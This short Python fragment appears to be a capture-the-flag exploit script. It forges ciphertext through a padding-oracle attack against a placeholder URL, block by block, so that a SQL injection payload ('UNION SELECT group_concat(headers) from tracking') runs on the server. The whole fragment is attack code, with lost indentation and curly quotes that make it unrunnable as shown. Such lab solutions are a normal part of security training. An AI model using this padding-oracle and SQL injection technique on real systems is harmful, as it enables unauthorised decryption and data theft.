if __name__ == ‘__main__’:
url = ‘http://URL/Dynamic Folder/’
post = ‘Dynamic Encrypted Post’
ciphertext = decode(post)[16*6:16*7]
immediate = bxor(b’$FLAG$”, “id”: “‘, decode(post)[16*(1+4):16*(1+5)])

plains = ‘{“id”:”0 UNION SELECT group_concat(headers), \’\’ from tracking”,”key”:”Dynamic Enc Key”}’
data = pad(plains.encode(‘utf-8’), 16)
block_amount = int(len(data) / 16)
index = block_amount
while True:
block = data[(index-1)*16: index*16]
print(‘meow：’)
print(block)
iv = bxor(immediate, block)
ciphertext = iv + ciphertext
index -= 1
if index > 0:
immediate = padding_oracle_decrypt(url, iv)
else:
break
print(encode(ciphertext))
